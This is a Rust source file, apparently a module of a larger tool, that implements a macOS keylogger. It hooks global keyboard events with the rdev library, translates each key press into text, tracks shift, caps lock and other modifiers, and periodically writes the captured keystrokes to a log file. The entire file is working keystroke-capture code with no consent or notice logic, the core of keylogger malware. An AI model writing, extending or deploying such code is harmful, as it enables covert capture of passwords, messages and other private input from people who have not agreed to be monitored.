use std::{fs::OpenOptions, time::SystemTime, fmt, collections::HashMap};

use rdev::{listen, Event, EventType, Key};
use anyhow::Result;

fn mac_to_standard_key(key_stroke: String) -> String {
    let res: String;
    let key_map: HashMap<&str, &str> = HashMap::from([
        ("KeyA", "a"),
        ("Escape", "[esc]"),
        ("KeyS", "s"),
        ("KeyD", "d"),
        ("KeyF", "f"),
        ("KeyG", "g"),
        ("KeyH", "h"),
        ("KeyJ", "j"),
        ("KeyK", "k"),
        ("KeyL", "l"),
        ("SemiColon", ";"),
        ("Quote", "'"),
        ("Return", "[retun]"),
        ("Backspace", "[backspace]"),
        ("ShiftLeft", "[Lshift]"),
        ("KeyZ", "z"),
        ("KeyX","x"),
        ("KeyC", "c"),
        ("KeyV", "v"),
        ("KeyB", "b"),
        ("KeyN", "n"),
        ("KeyM", "m"),
        ("Coma", ","),
        ("Dot", "."),
        ("Slash", "/"),
        ("ShiftRight", "[Rshift]"),
        ("ControlLeft", "[Lctrl]"),
        ("Alt", "[Loption]"),
        ("BackQuote", "`"),
        ("Num1", "1"),
        ("Num2", "2"),
        ("Num3", "3"),
        ("Num4", "4"),
        ("Num5", "5"),
        ("Num6", "6"),
        ("Num7", "7"),
        ("Num8", "8"),
        ("Num9", "9"),
        ("Num0", "0"),
        ("Minus", "-"),
        ("Equal", "="),
        ("Tab", "[tab]"),
        ("KeyQ", "q"),
        ("KeyW", "w"),
        ("KeyE", "e"),
        ("KeyR", "r"),
        ("KeyT", "t"),
        ("KeyY", "y"),
        ("KeyU", "u"),
        ("KeyI", "i"),
        ("KeyO", "o"),
        ("KeyP", "p"),
        ("LeftBracket", "["),
        ("RightBracket", "]"),
        ("BackSlash", "\\"),
        ("CapsLock", "[capslock]"),
        ("Space", "[space]"),
        ("UpArrow", "[uparrow]"),
        ("RightArrow", "[rightarrow]"),
        ("LeftArrow", "[leftarrow]"),
        ("DownArrow", "[downarrow]"),
        ("MetaRight", "[Rmeta]"),
        ("MetaLeft", "[Lmeta]"),
        ("F1", "[F1]"),
        ("F2", "[F2]"),
        ("F3", "[F3]"),
        ("F4", "[F4]"),
        ("F5", "[F5]"),
        ("F6", "[F6]"),
        ("F7", "[F7]"),
        ("F8", "[F8]"),
        ("F9", "[F9]"),
        ("F0", "[F0]"),
        ("Unknown(115)", "[home]"),
        ("Unknown(116)", "[pageup]"),
        ("Unknown(121)", "[pagedown]"),
    ]);
    if key_map.contains_key(&key_stroke.as_str()) {
        res = key_map[&key_stroke.as_str()].to_string();
    }else{
        res = format!("[{}]", key_stroke);
    }
    return res;
}

pub(crate) fn mac_log_keys(log_file: String, write_interval: u64) -> Result<()> {
    println!("Starting");
    let mut now = SystemTime::now();

    let mut shift: bool = false;
    let mut capslock: bool = false;
    let mut ctrl: bool = false;
    let mut option: bool = false;
    let mut func: bool = false;
        
    let mut file_options = OpenOptions::new();
    file_options.read(true);
    file_options.write(false);
    let mut capture_buffer: String = "".to_string();

    let _res = listen(move |event| {
        let mut key_tmp: String = "".to_string();

        match now.elapsed() {
            Ok(elapsed) => {
                if elapsed.as_secs() >= write_interval {
                    if capture_buffer.len() > 0 {
                        super::log_keys_to_disk(capture_buffer.clone(), log_file.clone() ).unwrap();
                    }
                    capture_buffer = "".to_string();
                    now = SystemTime::now();
                }
            }
            Err(e) => { println!("Error: {:?}", e); }
        }
        // println!("{:?}", event);
        match event.event_type {
            EventType::KeyPress(val) => {
                key_tmp = mac_to_standard_key(format!("{:?}", val));
                match key_tmp.as_str() {
                    "[Lshift]" => shift = true,
                    "[Rshift]" => shift = true,
                    "[capslock]" => capslock = !capslock,
                    "[Lctrl]" => ctrl = true,
                    "[Rctrl]" => ctrl = true,
                    "[Loption]" => option = true,
                    "[Roption]" => option = true,
                    "[Lfunction]" => func = true,
                    "[Rfunction]" => func = true,
                    _ => (),
                }
                now = SystemTime::now();
                capture_buffer.push_str(super::set_modifier(key_tmp.as_str(), shift, capslock, ctrl, option, func ).unwrap().as_str());
            },
            EventType::KeyRelease(val) => {
                key_tmp = mac_to_standard_key(format!("{:?}", val));
                match key_tmp.as_str() {
                    "[Lshift]" => shift = false,
                    "[Rshift]" => shift = false,
                    "[capslock]" => capslock = !capslock,
                    "[Lctrl]" => ctrl = false,
                    "[Rctrl]" => ctrl = false,
                    "[Loption]" => option = false,
                    "[Roption]" => option = false,
                    "[Lfunction]" => func = false,
                    "[Rfunction]" => func = false,
                    _ => (),
                }
            },
            EventType::ButtonPress(_) => (),
            EventType::ButtonRelease(_) => (),
            EventType::MouseMove { x, y } => (),
            EventType::Wheel { delta_x, delta_y } => (),
        }
    });

    Ok(())
}
